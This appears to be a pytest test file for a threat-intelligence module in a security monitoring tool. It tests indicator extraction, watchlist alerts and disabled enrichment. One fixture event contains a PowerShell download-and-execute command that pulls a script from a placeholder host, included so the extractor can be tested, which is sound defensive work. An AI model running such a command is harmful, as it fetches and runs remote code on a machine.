from core import database as db
from detection.engine import run_detection
from threat_intelligence.ioc_extractor import extract_from_event, is_internal_ip, normalize_indicator
from threat_intelligence.ioc_matcher import load_watchlist, run_ioc_analysis
from threat_intelligence.enrichment import enrich_ioc
from tests.helpers import ADMIN, ANALYST, ingest, temp_db
import pytest


def test_extraction_types_and_no_false_domains():
    ev = {"source_ip": "10.0.0.1", "destination_ip": "198.51.100.23", "domain": "Evil.Example.test.",
          "command_line": "powershell iex (iwr http://bad.test/a.ps1) ; update.exe 203.0.113.9 "
                          "275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f"}
    got = {(k, v) for k, v, _ in extract_from_event(ev)}
    assert ("ip", "198.51.100.23") in got and ("domain", "evil.example.test") in got
    assert ("url", "http://bad.test/a.ps1") in got and ("domain", "bad.test") in got
    assert ("ip", "203.0.113.9") in got and any(k == "hash" for k, _ in got)
    assert not any(v == "update.exe" for _, v in got)


def test_internal_ip_and_normalization():
    assert is_internal_ip("10.1.2.3") and is_internal_ip("127.0.0.1") and not is_internal_ip("198.51.100.1")
    assert normalize_indicator("domain", "EXAMPLE.test.") == "example.test"


def test_watchlist_matching_creates_traceable_alerts():
    with temp_db() as conn:
        ingest(conn, "sysmon_sample.json")
        n, errs = load_watchlist(conn)
        assert n == 5 and errs == []
        r = run_ioc_analysis(conn, ANALYST)
        assert r["watchlist_matches"] >= 3 and r["new_alerts"] >= 1
        a = db.get_alert(conn, db.list_alerts(conn, rule_id="IOC-001")[0]["alert_id"])
        assert a["event_ids"] and '"indicator_value"' in a["evidence"]
        assert run_ioc_analysis(conn, ANALYST)["new_alerts"] == 0  # idempotent
        # benign internal addresses are not stored as IOC candidates
        assert conn.execute("SELECT COUNT(*) FROM iocs WHERE indicator_value='10.0.0.21'").fetchone()[0] == 0


def test_bad_watchlist_rows_reported():
    with temp_db() as conn:
        n, errs = load_watchlist(conn, content="indicator_type,indicator_value\nip,1.2.3.4\nbogus,x\n")
        assert n == 1 and len(errs) == 1
        assert load_watchlist(conn, content="a,b\n1,2\n")[0] == 0


def test_external_enrichment_disabled_by_default():
    with temp_db() as conn:
        with pytest.raises(RuntimeError):
            enrich_ioc(conn, ADMIN, 1)
